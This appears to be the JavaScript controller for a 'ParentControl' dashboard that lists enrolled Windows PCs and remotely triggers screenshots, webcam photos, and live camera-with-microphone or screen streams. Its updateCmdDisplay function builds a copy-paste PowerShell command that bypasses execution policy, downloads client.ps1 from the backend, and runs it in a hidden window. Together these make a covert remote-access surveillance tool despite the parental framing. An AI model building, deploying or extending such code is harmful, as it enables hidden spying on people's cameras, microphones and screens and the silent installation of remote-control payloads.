// ═══════════════════════════════════════════════════════════════════
// ParentControl Dashboard — app.js
// ═══════════════════════════════════════════════════════════════════

// ── CONFIG: Update this after deploying backend to Render ───────────
const BACKEND_URL = 'https://YOUR-APP.onrender.com'; // ← change this
const ADMIN_PASSWORD_KEY = 'pc_admin_pw';

// ── State ────────────────────────────────────────────────────────────
let socket = null;
let devices = {};             // id -> device object
let currentStreamId = null;  // deviceId being streamed
let currentStreamType = null; // 'camera' or 'screen'
let mpegtsPlayer = null;

// ── On page load ──────────────────────────────────────────────────────
window.addEventListener('DOMContentLoaded', () => {
  // Auto-login with saved password
  const saved = sessionStorage.getItem(ADMIN_PASSWORD_KEY);
  if (saved) {
    document.getElementById('pw-input').value = saved;
    doLogin();
  }
  document.getElementById('pw-input').addEventListener('keydown', e => {
    if (e.key === 'Enter') doLogin();
  });
});

// ── Login ─────────────────────────────────────────────────────────────
function doLogin() {
  const pw = document.getElementById('pw-input').value.trim();
  document.getElementById('login-error').textContent = '';
  document.getElementById('login-btn').textContent = 'Connecting…';
  connectSocket(pw);
}

// ── Socket.IO Connection ──────────────────────────────────────────────
function connectSocket(password) {
  if (socket) { socket.disconnect(); socket = null; }

  socket = io(BACKEND_URL, {
    auth: { password },
    transports: ['websocket', 'polling'],
    reconnection: true,
    reconnectionAttempts: Infinity,
    reconnectionDelay: 2000,
    reconnectionDelayMax: 10000,
  });

  // ── Connected ──────────────────────────────────────────────────────
  socket.on('connect', () => {
    setConnected(true);
    sessionStorage.setItem(ADMIN_PASSWORD_KEY, password);
    document.getElementById('login-overlay').style.display = 'none';
    document.getElementById('app').classList.remove('hidden');
    updateCmdDisplay();
    toast('Connected to server', 'success');
    document.getElementById('login-btn').textContent = 'Access Dashboard';
  });

  // ── Auth failed ────────────────────────────────────────────────────
  socket.on('connect_error', err => {
    document.getElementById('login-btn').textContent = 'Access Dashboard';
    setConnected(false);
    if (err.message === 'auth_failed') {
      document.getElementById('login-error').textContent = '❌ Wrong password';
      sessionStorage.removeItem(ADMIN_PASSWORD_KEY);
      document.getElementById('login-overlay').style.display = '';
      document.getElementById('app').classList.add('hidden');
    }
  });

  socket.on('disconnect', () => {
    setConnected(false);
    toast('Disconnected from server', 'warning');
  });

  socket.on('reconnect', () => {
    setConnected(true);
    toast('Reconnected!', 'success');
  });

  // ── Device events ──────────────────────────────────────────────────
  socket.on('device_list', list => {
    devices = {};
    document.getElementById('device-grid').innerHTML = '';
    list.forEach(d => addOrUpdateDevice(d));
    refreshCounts();
  });

  socket.on('device_connected', d => {
    addOrUpdateDevice({ ...d, online: true });
    refreshCounts();
    toast(`Device #${d.code} connected!`, 'success');
  });

  socket.on('device_disconnected', ({ deviceId }) => {
    const d = devices[deviceId];
    if (d) { toast(`Device #${d.code} disconnected`, 'warning'); }
    setOffline(deviceId);
    refreshCounts();
  });

  socket.on('device_heartbeat', ({ deviceId, lastSeen }) => {
    if (devices[deviceId]) {
      devices[deviceId].lastSeen = lastSeen;
      const el = document.getElementById(`foot-${deviceId}`);
      if (el) el.textContent = 'Last seen: ' + fmtTime(lastSeen);
    }
  });

  // ── Media events ───────────────────────────────────────────────────
  socket.on('screenshot', ({ deviceId, data }) => {
    if (!devices[deviceId]) return;
    devices[deviceId].screenshot = data;
    setPreview(deviceId, data, 'screenshot');
    toast(`📸 Screenshot from #${devices[deviceId].code}`, 'info');
  });

  socket.on('photo', ({ deviceId, data }) => {
    if (!devices[deviceId]) return;
    devices[deviceId].photo = data;
    toast(`📷 Camera photo from #${devices[deviceId].code}`, 'info');
  });

  socket.on('stream_active', ({ deviceId }) => {
    if (deviceId === currentStreamId) {
      document.getElementById('stream-status').textContent = '● Streaming live';
    }
  });

  socket.on('stream_ended', ({ deviceId }) => {
    if (deviceId === currentStreamId) {
      document.getElementById('stream-status').textContent = 'Stream ended by device';
      const btn = document.getElementById(`live-${deviceId}`);
      if (btn) btn.classList.remove('streaming');
    }
  });

  socket.on('cmd_error', ({ message }) => {
    toast('Error: ' + message, 'error');
  });
}

// ═══════════════════════════════════════════════════════════════════
// Device Management
// ═══════════════════════════════════════════════════════════════════

function addOrUpdateDevice(d) {
  devices[d.id] = { ...d };

  // Remove old card if exists
  const old = document.getElementById(`card-${d.id}`);
  if (old) old.remove();

  const grid = document.getElementById('device-grid');
  grid.appendChild(buildCard(d));

  // If screenshot/photo was included in initial list
  if (d.screenshot) setPreview(d.id, d.screenshot, 'screenshot');

  // Hide empty state, show grid
  document.getElementById('empty-state').classList.add('hidden');
  grid.classList.remove('hidden');
}

function buildCard(d) {
  const card = document.createElement('div');
  card.className = `device-card glass${d.online ? '' : ' offline'}`;
  card.id = `card-${d.id}`;

  card.innerHTML = `
    <div class="card-top">
      <div class="code-wrap">
        <div class="code-label">Device Code</div>
        <div class="device-code">${d.code}</div>
      </div>
      <div id="badge-${d.id}" class="status-badge ${d.online ? 'on' : 'off'}">
        ${d.online ? '<span class="dot-pulse"></span>ONLINE' : '● OFFLINE'}
      </div>
    </div>

    <div class="device-info">
      <div class="device-hostname">🖥️ ${esc(d.info?.hostname || 'Unknown PC')}</div>
      <div class="device-meta">
        <span>🌐 ${esc(d.info?.ip || '—')}</span>
        <span>💿 ${esc((d.info?.os || 'Windows').split(' ').slice(0,2).join(' '))}</span>
        ${d.info?.username ? `<span>👤 ${esc(d.info.username)}</span>` : ''}
        ${d.info?.resolution ? `<span>🖥 ${esc(d.info.resolution)}</span>` : ''}
      </div>
    </div>

    <div class="preview" id="prev-${d.id}" onclick="openScreenshot('${d.id}')">
      <div class="preview-empty">
        <span>🖥️</span>
        <span>No screenshot yet</span>
      </div>
    </div>

    <div class="card-actions">
      <button class="act-btn" onclick="cmd('${d.id}','take_screenshot')" title="Take Screenshot">
        <span class="ico">📸</span><span class="lbl">Screenshot</span>
      </button>
      <button class="act-btn" onclick="cmd('${d.id}','take_photo')" title="Camera Photo">
        <span class="ico">📷</span><span class="lbl">Photo</span>
      </button>
      <button class="act-btn" onclick="cmd('${d.id}','flash_screen')" title="Flash Screen">
        <span class="ico">💡</span><span class="lbl">Flash</span>
      </button>
      <button class="act-btn live" id="live-${d.id}" onclick="toggleStream('${d.id}','camera')" title="Live Camera + Mic">
        <span class="ico">🎥</span><span class="lbl">Camera</span>
      </button>
      <button class="act-btn screen" id="screen-${d.id}" onclick="toggleStream('${d.id}','screen')" title="Live Screen">
        <span class="ico">🖥️</span><span class="lbl">Screen</span>
      </button>
    </div>

    <div class="card-foot" id="foot-${d.id}">
      Last seen: ${fmtTime(d.lastSeen)}
    </div>
  `;
  return card;
}

function setOffline(deviceId) {
  const card = document.getElementById(`card-${deviceId}`);
  const badge = document.getElementById(`badge-${deviceId}`);
  if (card)  card.classList.add('offline');
  if (badge) { badge.className = 'status-badge off'; badge.innerHTML = '● OFFLINE'; }
  if (devices[deviceId]) devices[deviceId].online = false;
}

function setPreview(deviceId, b64, type) {
  const el = document.getElementById(`prev-${deviceId}`);
  if (!el) return;
  el.innerHTML = `
    <img src="data:image/jpeg;base64,${b64}" alt="${type}" />
    <div class="preview-badge">${type === 'screenshot' ? '🖥️ Screen' : '📷 Camera'}</div>
  `;
}

function refreshCounts() {
  const all    = Object.values(devices);
  const online = all.filter(d => d.online).length;
  document.getElementById('online-count').textContent = online;
  document.getElementById('total-count').textContent  = all.length;
  if (all.length === 0) {
    document.getElementById('empty-state').classList.remove('hidden');
    document.getElementById('device-grid').classList.add('hidden');
  }
}

// ═══════════════════════════════════════════════════════════════════
// Commands
// ═══════════════════════════════════════════════════════════════════

function cmd(deviceId, action) {
  if (!socket?.connected) { toast('Not connected', 'error'); return; }
  const d = devices[deviceId];
  if (!d?.online)          { toast('Device is offline', 'error'); return; }
  socket.emit('command', { deviceId, action });

  const labels = {
    take_screenshot: '📸 Screenshot requested…',
    take_photo:      '📷 Camera photo requested…',
    flash_screen:    '💡 Flash sent!',
    start_live:      '🎥 Starting live stream…',
    stop_live:       '⏹ Stopping stream…',
  };
  toast(labels[action] || action, 'info');
}

// ═══════════════════════════════════════════════════════════════════
// Live Stream
// ═══════════════════════════════════════════════════════════════════

function toggleStream(deviceId, type) {
  const isCamera = (type === 'camera');
  const myId = currentStreamId === deviceId && currentStreamType === type;
  if (myId) { stopStream(); }
  else { startStream(deviceId, type); }
}

function startStream(deviceId, type = 'camera') {
  const d = devices[deviceId];
  if (!d?.online) { toast('Device offline', 'error'); return; }

  // Stop any existing stream
  stopStream();

  currentStreamId   = deviceId;
  currentStreamType = type;
  const isCamera = (type === 'camera');

  // Show modal
  const typeLabel = isCamera ? '🎥 Live Camera + Mic' : '🖥️ Live Screen';
  document.getElementById('live-title').textContent =
    `${typeLabel} — #${d.code} (${d.info?.hostname || ''})`;
  document.getElementById('live-modal').classList.remove('hidden');
  document.getElementById('stream-status').textContent = 'Connecting to device…';

  // Mark button
  const btnId = isCamera ? `live-${deviceId}` : `screen-${deviceId}`;
  const btn = document.getElementById(btnId);
  if (btn) btn.classList.add('streaming');

  // Send command to agent
  socket.emit('command', { deviceId, action: isCamera ? 'start_live' : 'start_screen' });
  toast(isCamera ? '🎥 Starting live camera…' : '🖥️ Starting live screen…', 'info');

  // Setup mpegts.js player
  const videoEl = document.getElementById('live-video');
  if (mpegtsPlayer) { try { mpegtsPlayer.destroy(); } catch (_) {} mpegtsPlayer = null; }

  if (typeof mpegts !== 'undefined' && mpegts.getFeatureList().mseLivePlayback) {
    mpegtsPlayer = mpegts.createPlayer({
      type: 'mpegts',
      isLive: true,
      url: `${BACKEND_URL}/api/stream/${deviceId}`,
      cors: true,
    }, {
      enableWorker: true,
      liveBufferLatencyChasing: true,
      liveBufferLatencyMaxLatency: 2.5,
      liveBufferLatencyMinRemain: 0.5,
    });
    mpegtsPlayer.attachMediaElement(videoEl);
    mpegtsPlayer.load();
    mpegtsPlayer.play().catch(() => {});

    mpegtsPlayer.on(mpegts.Events.ERROR, (type, detail) => {
      console.warn('mpegts error:', type, detail);
      document.getElementById('stream-status').textContent =
        '⚠️ Stream error — check if ffmpeg is ready on child device (wait 2-3 min after first connect)';
    });

    mpegtsPlayer.on(mpegts.Events.STATISTICS_INFO, () => {
      document.getElementById('stream-status').textContent = '● Streaming live';
    });
  } else {
    document.getElementById('stream-status').textContent =
      '⚠️ Browser does not support live MPEG-TS. Use Chrome or Edge.';
  }
}

function stopStream() {
  if (currentStreamId) {
    const action = (currentStreamType === 'screen') ? 'stop_screen' : 'stop_live';
    socket?.emit('command', { deviceId: currentStreamId, action });
    // Clear both button states
    const liveBtn   = document.getElementById(`live-${currentStreamId}`);
    const screenBtn = document.getElementById(`screen-${currentStreamId}`);
    if (liveBtn)   liveBtn.classList.remove('streaming');
    if (screenBtn) screenBtn.classList.remove('streaming');
    currentStreamId   = null;
    currentStreamType = null;
  }
  if (mpegtsPlayer) {
    try { mpegtsPlayer.pause(); mpegtsPlayer.destroy(); } catch (_) {}
    mpegtsPlayer = null;
  }
  document.getElementById('live-video').src = '';
  document.getElementById('live-modal').classList.add('hidden');
}

// ═══════════════════════════════════════════════════════════════════
// Screenshot Viewer
// ═══════════════════════════════════════════════════════════════════

function openScreenshot(deviceId) {
  const d = devices[deviceId];
  if (!d) return;
  const img = d.screenshot || d.photo;
  if (!img) { toast('No screenshot yet — click 📸 to capture', 'info'); return; }

  document.getElementById('ss-title').textContent =
    `Screenshot — #${d.code} (${d.info?.hostname || ''})`;
  document.getElementById('ss-img').src = `data:image/jpeg;base64,${img}`;
  document.getElementById('ss-meta').textContent =
    `${d.info?.hostname} • ${d.info?.ip} • ${new Date().toLocaleString()}`;
  document.getElementById('ss-modal').classList.remove('hidden');
}

// ═══════════════════════════════════════════════════════════════════
// UI Helpers
// ═══════════════════════════════════════════════════════════════════

function closeModal(id) {
  document.getElementById(id).classList.add('hidden');
}

function setConnected(ok) {
  const el = document.getElementById('conn-badge');
  el.className = `conn-badge ${ok ? 'connected' : 'disconnected'}`;
  document.getElementById('conn-text').textContent = ok ? 'Connected' : 'Disconnected';
}

function updateCmdDisplay() {
  const cmd = `powershell -w h -ep bypass -c "[Net.ServicePointManager]::SecurityProtocol='Tls12';(New-Object Net.WebClient).DownloadFile('${BACKEND_URL}/download/client.ps1','$env:TEMP\\pca.ps1');Start-Process powershell '-w h -ep bypass -File $env:TEMP\\pca.ps1 -ServerUrl ${BACKEND_URL}' -WindowStyle Hidden"`;
  document.getElementById('cmd-text').textContent = cmd;
}

function copyCmd() {
  const text = document.getElementById('cmd-text').textContent;
  navigator.clipboard.writeText(text)
    .then(() => { toast('Command copied!', 'success'); })
    .catch(() => { toast('Copy failed — select and copy manually', 'error'); });
}

function fmtTime(ts) {
  if (!ts) return 'Never';
  return new Date(ts).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
}

function esc(str) {
  const d = document.createElement('div');
  d.appendChild(document.createTextNode(String(str)));
  return d.innerHTML;
}

// ═══════════════════════════════════════════════════════════════════
// Toast Notifications
// ═══════════════════════════════════════════════════════════════════

function toast(msg, type = 'info') {
  const icons = { success: '✅', error: '❌', info: 'ℹ️', warning: '⚠️' };
  const container = document.getElementById('toasts');
  const el = document.createElement('div');
  el.className = `toast ${type}`;
  el.innerHTML = `<span>${icons[type] || ''}</span><span>${msg}</span>`;
  container.appendChild(el);

  setTimeout(() => {
    el.classList.add('out');
    el.addEventListener('animationend', () => el.remove(), { once: true });
  }, 4000);
}

// ── Keyboard shortcuts ────────────────────────────────────────────────
document.addEventListener('keydown', e => {
  if (e.key === 'Escape') {
    closeModal('ss-modal');
    stopStream();
  }
});
